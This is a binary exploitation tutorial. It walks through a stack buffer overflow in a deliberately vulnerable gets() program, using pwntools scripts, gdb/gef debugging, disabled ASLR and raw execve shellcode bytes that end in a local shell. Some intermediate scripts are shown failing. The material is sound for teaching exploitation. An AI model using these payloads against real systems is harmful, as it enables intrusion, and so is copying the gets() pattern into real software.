# Exploitation

Let's take our previous program from the bof

{% file src="../../../../.gitbook/assets/buffer-overflow \(1\).zip" caption="buffer-overflow.zip" %}

With source code

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");
}

int main() {
    char buf[64];
    puts("What are you going to say?");
    gets(buf);
    puts("Thank you, have a nice day!");
    return 0;
}
```

We're going to want to turn off ASLR for this one

```c
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
[sudo] password for tango: 
0
```

So originally, our plan of attack was

```python
from pwn import *

e = context.binary = ELF("./bof")
p = process(e.path)
libc = e.libc

payload = b"A"*72
payload += p64(e.symbols["win"])

p.sendline(payload)
p.interactive()
```

But now, let's change it up a bit. As the binary doesn't have NX enabled, we have some writable and executable pages. We can check this in gdb by using `vmmap in gef.`

```python
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- ./bof
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x ./bof
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- ./bof
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- ./bof
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- ./bof
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dd3000 0x00007ffff7dd5000 0x0000000000000000 rw- 
0x00007ffff7dd5000 0x00007ffff7dfb000 0x0000000000000000 r-- /usr/lib/libc-2.32.so
0x00007ffff7dfb000 0x00007ffff7f48000 0x0000000000026000 r-x /usr/lib/libc-2.32.so
0x00007ffff7f48000 0x00007ffff7f94000 0x0000000000173000 r-- /usr/lib/libc-2.32.so
0x00007ffff7f94000 0x00007ffff7f97000 0x00000000001be000 r-- /usr/lib/libc-2.32.so
0x00007ffff7f97000 0x00007ffff7f9a000 0x00000000001c1000 rw- /usr/lib/libc-2.32.so
0x00007ffff7f9a000 0x00007ffff7fa0000 0x0000000000000000 rw- 
0x00007ffff7fca000 0x00007ffff7fce000 0x0000000000000000 r-- [vvar]
0x00007ffff7fce000 0x00007ffff7fd0000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd0000 0x00007ffff7fd2000 0x0000000000000000 r-- /usr/lib/ld-2.32.so
0x00007ffff7fd2000 0x00007ffff7ff3000 0x0000000000002000 r-x /usr/lib/ld-2.32.so
0x00007ffff7ff3000 0x00007ffff7ffc000 0x0000000000023000 r-- /usr/lib/ld-2.32.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002b000 r-- /usr/lib/ld-2.32.so
0x00007ffff7ffd000 0x00007ffff7fff000 0x000000000002c000 rw- /usr/lib/ld-2.32.so
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

```

As we can see, the stack has permission `rwx`. That means that we can read, write, and execute to it. So let's set up our exploit

```python
from pwn import *

e = context.binary = ELF("./bof")
p = process(e.path)
libc = e.libc

shellcode = asm(shellcraft.sh())
payload = shellcode
payload += b"A"*(72 - len(shellcode))

p.sendline(payload)
p.interactive()
```

As we've set the `context.binary`, pwntools takes care of the architecture and operating system \(you can check what shellcode options there are here [https://docs.pwntools.com/en/stable/shellcraft.html](https://docs.pwntools.com/en/stable/shellcraft.html)\)

We then send in \(72 - the length of our shellcode\) times the character A. Now, we just need to find the address for where our shellcode is stored. gef can help with that

```c
gef➤  r
Starting program: ./bof 
What are you going to say?
AAAAAAAA
Thank you, have a nice day!
[Inferior 1 (process 63337) exited normally]
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401159 <+0>:	push   rbp
   0x000000000040115a <+1>:	mov    rbp,rsp
   0x000000000040115d <+4>:	sub    rsp,0x40
   0x0000000000401161 <+8>:	lea    rdi,[rip+0xea4]        # 0x40200c
   0x0000000000401168 <+15>:	call   0x401030 <puts@plt>
   0x000000000040116d <+20>:	lea    rax,[rbp-0x40]
   0x0000000000401171 <+24>:	mov    rdi,rax
   0x0000000000401174 <+27>:	mov    eax,0x0
   0x0000000000401179 <+32>:	call   0x401050 <gets@plt>
   0x000000000040117e <+37>:	lea    rdi,[rip+0xea2]        # 0x402027
   0x0000000000401185 <+44>:	call   0x401030 <puts@plt>
   0x000000000040118a <+49>:	mov    eax,0x0
   0x000000000040118f <+54>:	leave  
   0x0000000000401190 <+55>:	ret    
End of assembler dump.
gef➤  b *main+55
Breakpoint 1 at 0x401190
gef➤  r
Starting program: ./bof 
What are you going to say?
AAAAAAAA
Thank you, have a nice day!

Breakpoint 1, 0x0000000000401190 in main ()
...
gef➤  grep AAAAAAAA
[+] Searching 'AAAAAAAA' in memory
[+] In '[heap]'(0x405000-0x426000), permission=rw-
  0x4056b0 - 0x4056ba  →   "AAAAAAAA\n" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffe010 - 0x7fffffffe018  →   "AAAAAAAA" 

```

So we see that our input is stored at address `0x7fffffffe010`. So let's chuck that into our exploit, and it should work.

```c
$ python exploit-x86_64.py
[*] './bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './bof': pid 63543
[*] Switching to interactive mode
What are you going to say?
Thank you, have a nice day!
[*] Got EOF while reading in interactive
$ ls
[*] Process './bof' stopped with exit code -11 (SIGSEGV) (pid 63543)
[*] Got EOF while sending in interactive

```

Ah, it didn't seem to work. What's happened? Let's attach this to gdb, and figure out the reason

{% code title="exploit.py" %}
```c
from pwn import *

e = context.binary = ELF("./bof")
p = process(e.path)
libc = e.libc

input("Waiting....")
shellcode = asm(shellcraft.sh())
payload = shellcode
payload += b"A"*(72 - len(shellcode))
payload += p64(0x7fffffffe010)

p.sendline(payload)
p.interactive()
```
{% endcode %}

```c
$ python exploit-x86_64.py         
[*] './bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './bof': pid 64010
Waiting.... 
```

On another terminal, we're going to attach the the binary from the `pid` that pwntools spits out

```c
$ gdb -q -p 64010
 ....
─────────────────────────────────── code:x86:64 ────
   0x7ffff7ec5ebc <read+12>        test   eax, eax
   0x7ffff7ec5ebe <read+14>        jne    0x7ffff7ec5ed0 <read+32>
   0x7ffff7ec5ec0 <read+16>        syscall 
 → 0x7ffff7ec5ec2 <read+18>        cmp    rax, 0xfffffffffffff000
   0x7ffff7ec5ec8 <read+24>        ja     0x7ffff7ec5f20 <read+112>
   0x7ffff7ec5eca <read+26>        ret    
   0x7ffff7ec5ecb <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7ec5ed0 <read+32>        sub    rsp, 0x28
   0x7ffff7ec5ed4 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
...
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401159 <+0>:	push   rbp
   0x000000000040115a <+1>:	mov    rbp,rsp
   0x000000000040115d <+4>:	sub    rsp,0x40
   0x0000000000401161 <+8>:	lea    rdi,[rip+0xea4]        # 0x40200c
   0x0000000000401168 <+15>:	call   0x401030 <puts@plt>
   0x000000000040116d <+20>:	lea    rax,[rbp-0x40]
   0x0000000000401171 <+24>:	mov    rdi,rax
   0x0000000000401174 <+27>:	mov    eax,0x0
   0x0000000000401179 <+32>:	call   0x401050 <gets@plt>
   0x000000000040117e <+37>:	lea    rdi,[rip+0xea2]        # 0x402027
   0x0000000000401185 <+44>:	call   0x401030 <puts@plt>
   0x000000000040118a <+49>:	mov    eax,0x0
   0x000000000040118f <+54>:	leave  
   0x0000000000401190 <+55>:	ret    
End of assembler dump.
gef➤  b *main+55
Breakpoint 1 at 0x401190
gef➤  c
Continuing.

```

So we attach to the process, and come in at the assembly code `read+18`. That just means it's waiting for our user input. We then set a breakpoint at `main+55` to stop the execution once that point hits. And then we continue. When we hit `Enter` on the python terminal and look at our gdb instance

```c

Breakpoint 1, 0x0000000000401190 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ec5f67  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe0c8  →  0x00007fffffffe010  →  0x0000000000000000
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00000000004052a0  →  "Thank you, have a nice day!\n"
$rdi   : 0x00007ffff7f9a4f0  →  0x0000000000000000
$rip   : 0x0000000000401190  →  <main+55> ret 
$r8    : 0x1c              
$r9    : 0x0               
$r10   : 0x70              
$r11   : 0x246             
$r12   : 0x0000000000401060  →  <_start+0> endbr64 
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────── stack ────
0x00007fffffffe0c8│+0x0000: 0x00007fffffffe010  →  0x0000000000000000	 ← $rsp
0x00007fffffffe0d0│+0x0008: 0x00007fffffffe100  →  0x0000000000401060  →  <_start+0> endbr64 
0x00007fffffffe0d8│+0x0010: 0x00000001f7dfcfcb
0x00007fffffffe0e0│+0x0018: 0x0000000000401159  →  <main+0> push rbp
0x00007fffffffe0e8│+0x0020: 0x0000004000000000
0x00007fffffffe0f0│+0x0028: 0x0000000000000000
0x00007fffffffe0f8│+0x0030: 0xa949ffd88ab16cbb
0x00007fffffffe100│+0x0038: 0x0000000000401060  →  <_start+0> endbr64 
──────────────────────────────────────── code:x86:64 ────
     0x401181 <main+40>        movabs ds:0xfffffea6e800000e, al
     0x40118a <main+49>        mov    eax, 0x0
     0x40118f <main+54>        leave  
 →   0x401190 <main+55>        ret    
   ↳  0x7fffffffe010                  add    BYTE PTR [rax], al
      0x7fffffffe012                  add    BYTE PTR [rax], al
      0x7fffffffe014                  add    BYTE PTR [rax], al
      0x7fffffffe016                  add    BYTE PTR [rax], al
      0x7fffffffe018                  test   eax, 0xfff7e573
      0x7fffffffe01d                  jg     0x7fffffffe01f
────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x401190 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────── trace ────
[#0] 0x401190 → main()
────────────────────────────────────────────────────────────────────
gef➤  

```

Ahhhhh, I see the problem now. If we take a look at our stack pointer register

```c
$rsp   : 0x00007fffffffe0c8  →  0x00007fffffffe010  →  0x0000000000000000
```

It ends in an `8`. This means that our stack pointer isn't correctly aligned, so it doesn't know where to go. That's alright, we just have to correct that in our exploit script

```c
from pwn import *

e = context.binary = ELF("./bof")
p = process(e.path)
libc = e.libc

input("Waiting....")
shellcode = asm(shellcraft.sh())
payload = shellcode
payload += payload.ljust(72, b"A")
payload += p64(0x7fffffffe010)

p.sendline(payload)
p.interactive()
```

And now run it

```c
$ python exploit-x86_64.py
[*] './bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './bof': pid 64784
Waiting....
[*] Switching to interactive mode
What are you going to say?
Thank you, have a nice day!
[*] Got EOF while reading in interactive
$ 
[*] Process './bof' stopped with exit code -11 (SIGSEGV) (pid 64784)
[*] Got EOF while sending in interactive
```

Aannndddd that didn't work, when attaching it again we see our stack hasn't been aligned.

After debugging for 2 hours, I'm managed to get my shellcode to be jumped to, but the actual pwntools shellcode doesn't work, which is ... very odd. I noticed that my shellcode wasn't the actual place where the binary was jumping to, but a couple of addresses before hand. So I decided to nop to the address, which works. Then the shellcode goes through, but doesn't end up executing the last 3 instructions, but jumps somewhere. 

If we change the shellcode to one found at [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/) , let's say this shellcode:

[http://shell-storm.org/shellcode/files/shellcode-806.php](http://shell-storm.org/shellcode/files/shellcode-806.php)

```c
from pwn import *

e = context.binary = ELF("./bof")
p = process(e.path)
libc = e.libc

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = shellcode
payload = payload.ljust(72, b"A")
payload += p64(0x7fffffffdff0)

input("Waiting...")
p.sendline(payload)
p.interactive()
```

And now running it:

```python
$ python exploit.py 
[*] './bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './bof': pid 5052
Waiting...
[*] Switching to interactive mode
What are you going to say?
Thank you, have a nice day!
$ id
uid=1000(tango) gid=1000(tango) groups=1000(tango),0(root),90(network),108(vboxusers),967(docker),969(tablet),991(lp)
$ echo pwned
pwned
```

